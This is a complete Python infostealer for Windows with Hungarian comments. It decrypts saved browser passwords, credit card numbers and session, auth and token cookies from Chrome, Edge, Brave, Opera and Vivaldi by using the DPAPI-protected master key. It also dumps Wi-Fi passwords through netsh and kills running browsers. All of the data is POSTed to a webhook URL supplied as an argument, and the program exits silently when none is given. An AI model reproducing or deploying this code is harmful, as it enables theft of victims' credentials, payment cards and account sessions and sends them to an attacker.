import os
import json
import base64
import sqlite3
import shutil
import win32crypt
from Crypto.Cipher import AES
import time
import psutil
import sys 
import subprocess
from concurrent.futures import ThreadPoolExecutor
import requests 

class AllInOneExtractor:
    def __init__(self):
        # Az adatokat már nem egy stringbe, hanem egy strukturált szótárba gyűjtjük
        self.collected_data = {
            "Username": os.getlogin(),
            "MachineName": os.environ.get('COMPUTERNAME', 'N/A'),
            "Passwords": [],
            "CreditCards": [],
            "Cookies": [],
            "WifiNetworks": []
        }
        self.browser_processes = {
            "Google Chrome": "chrome.exe", "Microsoft Edge": "msedge.exe",
            "Brave": "brave.exe", "Vivaldi": "vivaldi.exe",
            "Opera": "opera.exe", "Opera GX": "opera.exe",
        }

    def get_key(self, browser_path):
        try:
            local_state_path = os.path.join(browser_path, "Local State")
            if not os.path.exists(local_state_path): return None
            with open(local_state_path, "r", encoding="utf-8", errors="ignore") as f:
                ls = json.load(f)
            key = base64.b64decode(ls["os_crypt"]["encrypted_key"])[5:]
            return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]
        except: return None

    def decrypt(self, buff, key):
        try:
            iv = buff[3:15]
            payload = buff[15:]
            cipher = AES.new(key, AES.MODE_GCM, iv)
            return cipher.decrypt(payload)[:-16].decode()
        except:
            try:
                return str(win32crypt.CryptUnprotectData(buff, None, None, None, 0)[1])
            except:
                return ""

    def process_passwords(self, profile_path, browser_name, key):
        db_path = os.path.join(profile_path, "Login Data")
        if not os.path.exists(db_path): return
        temp_db = f"temp_pass_{os.getpid()}_{int(time.time() * 1000000)}.db"
        try: shutil.copyfile(db_path, temp_db)
        except: return
        try:
            conn = sqlite3.connect(temp_db)
            cursor = conn.cursor()
            cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
            for url, user, pwd_blob in cursor.fetchall():
                pwd = self.decrypt(pwd_blob, key)
                if user and pwd:
                    # Adat hozzáadása a szótárhoz
                    self.collected_data["Passwords"].append({
                        "Browser": browser_name, "URL": url, "Username": user, "Password": pwd
                    })
            conn.close()
        except: pass
        finally:
            if os.path.exists(temp_db): os.remove(temp_db)

    def process_credit_cards(self, profile_path, browser_name, key):
        db_path = os.path.join(profile_path, "Web Data")
        if not os.path.exists(db_path): return
        temp_db = f"temp_cc_{os.getpid()}_{int(time.time() * 1000000)}.db"
        try: shutil.copyfile(db_path, temp_db)
        except: return
        try:
            conn = sqlite3.connect(temp_db)
            cursor = conn.cursor()
            cursor.execute("SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted FROM credit_cards")
            for name, exp_m, exp_y, cc_blob in cursor.fetchall():
                cc_num = self.decrypt(cc_blob, key)
                if name and cc_num:
                    self.collected_data["CreditCards"].append({
                        "Browser": browser_name, "Name": name, "Expiry": f"{exp_m}/{exp_y}", "CardNumber": cc_num
                    })
            conn.close()
        except: pass
        finally:
            if os.path.exists(temp_db): os.remove(temp_db)

    def process_cookies(self, profile_path, browser_name, key):
        db_path = os.path.join(profile_path, "Network", "Cookies")
        if not os.path.exists(db_path): return
        temp_db = f"temp_cookies_{os.getpid()}_{int(time.time() * 1000000)}.db"
        try: shutil.copyfile(db_path, temp_db)
        except: return
        try:
            conn = sqlite3.connect(temp_db)
            cursor = conn.cursor()
            cursor.execute("SELECT host_key, name, encrypted_value FROM cookies WHERE name LIKE '%session%' OR name LIKE '%auth%' OR name LIKE '%token%'")
            for host, name, encrypted_value in cursor.fetchall():
                value = self.decrypt(encrypted_value, key)
                if value:
                    self.collected_data["Cookies"].append({
                        "Browser": browser_name, "Host": host, "Name": name, "Value": value
                    })
            conn.close()
        except: pass
        finally:
            if os.path.exists(temp_db): os.remove(temp_db)

    def process_wifi_passwords(self):
        try:
            profiles_data = subprocess.check_output('netsh wlan show profiles', shell=True, stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL).decode('utf-8', errors='ignore').split('\n')
            profiles = [i.split(":")[1][1:-1] for i in profiles_data if "All User Profile" in i]
            for profile in profiles:
                try:
                    profile_info = subprocess.check_output(f'netsh wlan show profile "{profile}" key=clear', shell=True, stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL).decode('utf-8', errors='ignore').split('\n')
                    password = [i.split(":")[1][1:-1] for i in profile_info if "Key Content" in i]
                    if password:
                        self.collected_data["WifiNetworks"].append({"SSID": profile, "Password": password[0]})
                except: continue
        except: pass

    def find_browsers(self):
        targets = {}
        paths = {
            "Google Chrome": os.path.join(os.environ['LOCALAPPDATA'], "Google", "Chrome", "User Data"),
            "Microsoft Edge": os.path.join(os.environ['LOCALAPPDATA'], "Microsoft", "Edge", "User Data"),
            "Brave": os.path.join(os.environ['LOCALAPPDATA'], "BraveSoftware", "Brave-Browser", "User Data"),
            "Opera": os.path.join(os.environ['APPDATA'], "Opera Software", "Opera Stable"),
            "Opera GX": os.path.join(os.environ['APPDATA'], "Opera Software", "Opera GX Stable"),
            "Vivaldi": os.path.join(os.environ['LOCALAPPDATA'], "Vivaldi", "User Data"),
        }
        for name, path in paths.items():
            if os.path.exists(path):
                targets[name] = path
        return targets

    def kill_browsers(self):
        for proc in psutil.process_iter(['name']):
            if proc.info['name'] in self.browser_processes.values():
                try:
                    proc.kill()
                except:
                    pass

    def run(self, webhook_url): 
        self.kill_browsers()
        time.sleep(0.5)
        
        self.process_wifi_passwords()

        browsers = self.find_browsers()
        for name, path in browsers.items():
            key = self.get_key(path)
            if not key:
                continue
            
            profile_paths = []
            try:
                profile_paths = [os.path.join(path, d) for d in os.listdir(path) if os.path.isdir(os.path.join(path, d)) and (d == "Default" or d.startswith("Profile "))]
                if os.path.exists(os.path.join(path, "Login Data")):
                    profile_paths.append(path)
            except Exception:
                continue

            with ThreadPoolExecutor(max_workers=4) as executor:
                for p_path in profile_paths:
                    executor.submit(self.process_passwords, p_path, name, key)
                    executor.submit(self.process_credit_cards, p_path, name, key)
                    executor.submit(self.process_cookies, p_path, name, key)
        
        # A print() helyett elküldjük az adatokat a webhookra
        if any(self.collected_data[key] for key in ["Passwords", "CreditCards", "Cookies", "WifiNetworks"]):
            try:
                headers = {'Content-Type': 'application/json'}
                requests.post(webhook_url, data=json.dumps(self.collected_data, indent=4), headers=headers)
            except:
                pass

if __name__ == '__main__':
    # Ellenőrizzük, hogy kaptunk-e argumentumot
    if len(sys.argv) > 1:
        # Az első argumentum (a link) lesz az URL
        url_from_arg = sys.argv[1]
        extractor = AllInOneExtractor()
        extractor.run(webhook_url=url_from_arg)
    # Ha nem kapunk URL-t, a program csendben kilép